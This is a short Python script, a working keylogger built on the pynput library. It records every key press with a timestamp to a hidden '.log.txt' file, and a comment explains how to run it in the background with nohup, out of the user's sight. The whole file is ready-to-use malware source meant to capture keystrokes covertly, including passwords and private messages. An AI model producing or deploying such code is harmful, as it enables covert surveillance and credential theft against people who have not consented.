#pip install pynput
#run on Background 'nohup python3 keylogger.py &'
import logging
from pynput.keyboard import Key, Listener
from multiprocessing import Process
import os
import signal

log_dir = ""
# CHANGE DIRECTORY TO STORE THE LOG FILE
logging.basicConfig(filename=(log_dir + ".log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

def start_keylogger():
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    keylogger_process = Process(target=start_keylogger)
    keylogger_process.start()
    print(f"Keylogger started with PID: {keylogger_process.pid}")
    print("Use this PID to kill the process when needed.")
